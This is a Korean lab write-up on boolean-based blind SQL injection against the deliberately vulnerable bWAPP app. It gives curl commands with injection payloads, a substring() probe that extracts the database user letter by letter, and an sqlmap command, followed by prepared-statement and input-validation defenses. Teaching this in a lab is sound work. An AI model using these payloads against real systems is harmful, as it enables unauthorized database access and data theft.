# 웹 해킹 실습 교육: SQL Injection - Blind - Boolean-Based

> **교육 목적 전용 (For Educational Purposes Only)**  
> 본 문서는 bWAPP(Bee-Box) 취약점 실습 환경을 대상으로 작성되었습니다.  
> 허가 없이 타인의 시스템에 적용하는 것은 불법입니다.

---

## 📋 실습 환경 정보

| 항목 | 내용 |
|------|------|
| **대상 서버** | `192.168.0.20` (bWAPP Bee-Box) |
| **공격자 서버** | `192.168.0.146` (Kali Linux) |
| **실습 URL** | `http://192.168.0.20/bWAPP/sqli_4.php` |
| **계정 정보** | `bee / bug` |
| **보안 레벨** | Low (Security Level: 0) |
| **실습 일시** | 2026-04-20 |

---

## 🎯 취약점 개요

### Blind SQL Injection (Boolean-Based) 이란?

일반적인 SQL Injection(Error-Based 또는 UNION-Based)과 다르게, 이번 타겟 페이지는 데이터베이스의 결괏값이나 에러 화면을 브라우저에 구체적으로 노출하지 않습니다. 단순히 영화 제목이 DB에 **"존재한다(True)"** 혹은 **"존재하지 않는다(False)"** 두 가지 반응만 출력합니다.

공격자는 이 **참/거짓(Boolean)** 반응을 마치 스무고개처럼 활용하여, 무수히 많은 쿼리 질문을 던짐으로써 시스템 계정, 테이블명, 시스템 설정 정보 등을 한 글자씩 유추해(탈취해) 나옵니다. 

### OWASP Top 10 분류
- **A03:2021** – Injection

---

## 🔍 공격 흐름 다이어그램

```
[공격자 (Kali Linux)]
        │
        ▼
[1단계] 대상 파라미터 (title) 확보 및 참/거짓 분기점 식별
        (존재하는 영화 제목 'Iron Man' 검색 시 "exists" 응답 인지)
        │
        ▼
[2단계] 논리 연산자(AND)를 이용한 Boolean 삽입 점검
        (title=Iron Man' and 1=1 -- - 은 참, 1=0 은 거짓으로 반응하는지 테스트)
        │
        ▼
[3단계] DB 내장 함수를 활용한 정보(시스템 탈취) 탐색
        (title=Iron Man' and substring(current_user(),1,1)='r' -- - 를 전송해 참/거짓 판단)
        │
        ▼
[4단계] 스크립트 또는 공격 도구(sqlmap)를 통한 전체 데이터 추출
```

---

## 🛠️ 단계별 실습 (실제 실행 명령어)

### Step 1: 참(True) / 거짓(False) 판별 지표 테스트

블라인드 인젝션의 핵심인 "서버의 응답 분기점"을 찾기 위해 강제로 참과 거짓 명제를 보내봅니다.
참일 경우 **"The movie exists"**가 출력되며, 거짓일 경우 **"The movie does not exist"**가 출력됩니다.

```bash
# [참 쿼리 테스트] Iron Man 이면서 항상 참(1=1)인 조건 전달
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     --get \
     --data-urlencode "title=Iron Man' and 1=1 -- -" \
     "http://192.168.0.20/bWAPP/sqli_4.php?action=search" | grep -i "The movie"

# [결과] The movie exists in our database!

# [거짓 쿼리 테스트] Iron Man 이지만 항상 거짓(1=0)인 조건 전달
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     --get \
     --data-urlencode "title=Iron Man' and 1=0 -- -" \
     "http://192.168.0.20/bWAPP/sqli_4.php?action=search" | grep -i "The movie"

# [결과] The movie does not exist in our database!
```

---

### Step 2: Boolean-Based 정보 탈취 (서버 실행 계정 첫 글자 알아내기)

참/거짓을 완벽히 통제할 수 있게 되었습니다. 이제 이 지표를 사용해 실제로 정보가 맞는지 틀린 지 맞춰보는 질의를 던집니다. 현재 시스템 데이터베이스가 동작 중인 유저(`current_user()`)의 첫 글자가 'r' 인지 묻는 명령어입니다.

```bash
# 현재 접속 중인 계정의 첫 번째 글자가 'r'인지 질문 (substring 함수 활용)
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     --get \
     --data-urlencode "title=Iron Man' and substring(current_user(),1,1)='r' -- -" \
     "http://192.168.0.20/bWAPP/sqli_4.php?action=search" | grep -i "The movie"

# [결과] The movie exists in our database!
# 공격자 해석: "아, 'exists'가 떨어졌으니 첫 글자는 'r'이 맞구나!"
```

> 🚨 **해킹 작동 원리**:
> 해커는 위와 같은 방식을 a부터 z까지 대입해 보면서 알파벳 단어를 완성해나갑니다. (`root@localhost` 등)
> 이 글자를 하나씩 비교하는 과정은 사람이 수동으로 하기엔 너무 느리기 때문에, 주로 파이썬(Python) 자동화 스크립트를 작성하거나 **SQLMap** 같은 공격 도구를 활용하여 몇 분 안에 데이터베이스의 전체 항목을 탈취하게 됩니다.

---

### Step 3: 취약점 스캐너 자동화 공격 (SQLMap 연동)

Boolean-Based Blind SQLi는 추출 속도를 극대화하기 위해 거의 반드시 자동화 도구와 연계됩니다.
실습 환경의 인증 정보(PHP Session ID)를 도구 실행 인자에 직접 부여하면, SQLMap 내장 스크립트가 참/거짓 패턴을 자동으로 인식하고 데이터베이스를 점령해줍니다.

```bash
# 1. 대상 URL, 세션 쿠키(-cookie), 점검 변수 지정(-p title) 후 DBMS 계정 정보 덤프(--current-user)
sqlmap -u "http://192.168.0.20/bWAPP/sqli_4.php?title=Iron+Man&action=search" \
       --cookie="PHPSESSID=발급받은세션값; security_level=0" \
       -p title \
       --technique=B \
       --current-user \
       --batch
```

**실행 결과 및 분석:**
> 1. SQLMap이 `--technique=B` (Boolean-based blind 방식) 옵션 설정을 기반으로 자체 판단 기준을 빠르게 대입합니다.
> 2. 터미널 결과에 `[INFO] GET parameter 'title' is 'MySQL boolean-based blind' injectable` 과 같은 파각(식별) 알림이 뜹니다.
> 3. 최종적으로 시스템 내 현재 실행 중인 데이터베이스 유저명(`root@localhost` 등)을 화면 상에 단숨에 나열(Dump)하여 보여줍니다.

---

## 📊 탈취(추출) 정보 요약

- **파급 효과(시스템 정보/사용자 영향)**: 일반적인 SQL Injection과 결과적으로 다르지 않습니다. 속도만 느릴 뿐, `substring()`이나 `ascii()` 등의 함수를 조합하여 시스템 계정 리스트, 백엔드 관리자 비밀번호, 다른 웹 이용자의 민감한 정보 등 **DB(데이터베이스) 내의 모든 열람 가능 데이터를 추출**해낼 수 있습니다.

---

## 🛡️ 취약점 발생 원인 및 방어 기법

### 취약점 메커니즘
해당 페이지에서는 에러 로그를 출력하지 않고 쿼리 리절트의 Row Count가 0인지 1인지만 판별하도록 방어 코드가 되어있었으나, 근본적으로 **사용자가 입력한 `title` 변수가 SQL 문법적인 공간에 아무런 필터링이나 이스케이프닝 없이 그대로 병합**되는 구문(`sqli()` low level 동작)을 허용하고 있기 때문입니다.

### 방어(Secure Coding) 가이드

근본적인 대응 가이드는 다른 유형의 SQL 인젝션과 동일합니다. 화면에 디테일한 에러를 띄워주지 않는 것(Error-Blind 처리)은 임시방편(Security through obscurity)일 뿐입니다.

1. **Prepared Statements (바인딩 변수) 사용 ⭐️**
   PHP 개발 시 `PDO` 또는 `MySQLi`를 사용하여 SQL 쿼리의 뼈대와 사용자 입력값(데이터)을 논리적으로 분리하는 것이 가장 확실한 예방 방법입니다. 변수를 `?`로 바인딩하면, 입력된 `1=1`과 같은 논리는 명령어가 아닌 단순 문자열 제목 속성으로만 취급되어 무력화됩니다.
2. **입력란 검증(Validation)**
   입력값이 특수기호(`'`, `--`, `#` 등)를 포함하지 못하도록 화이트리스트 혹은 적절한 정규표현식을 통해 철저히 필터링해야 합니다.

---

## ⚖️ 법적 고지

> 이 문서의 모든 기법은 **bWAPP(Bee-Box)** 의도적 취약 환경에서  
> **교육 목적**으로만 수행되었습니다.  
> 허가받지 않은 환경에 해당 기술을 활용할 경우 **심각한 불법 행위**로 간주됩니다.
> 반드시 본인 소유 또는 적법한 동의를 얻은 환경 내에서 활용하십시오.

---

*작성일: 2026-04-20 | 실습 환경: Kali Linux + bWAPP Bee-Box | 작성: ngnicky-ai*
